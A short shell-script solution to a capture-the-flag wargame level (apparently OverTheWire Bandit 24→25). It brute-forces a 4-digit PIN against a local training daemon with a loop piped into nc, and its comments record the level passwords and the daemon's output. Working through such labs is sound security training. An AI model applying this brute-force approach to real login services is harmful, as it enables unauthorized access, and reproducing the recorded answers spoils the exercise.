#!/bin.bash

# Level 24 -> 25 Prompt

: << 'END'
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
END


# create a script in /tmp/<username>

: << 'END'
#!/bin/bash

for i in {0000..9999}; do
		printf "%s\n" "$i"
  		printf "%s %s\n" "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar" "$i"
done

END


./script.sh | nc localhost 30002
# Note that letting the daemon write to stdout resulted in a time out error

./script.sh | nc localhost 30002 > output.txt

cat output.txt | sort | uniq -u

: << 'END'
	Correct!
	Exiting.
	I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
	The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
END
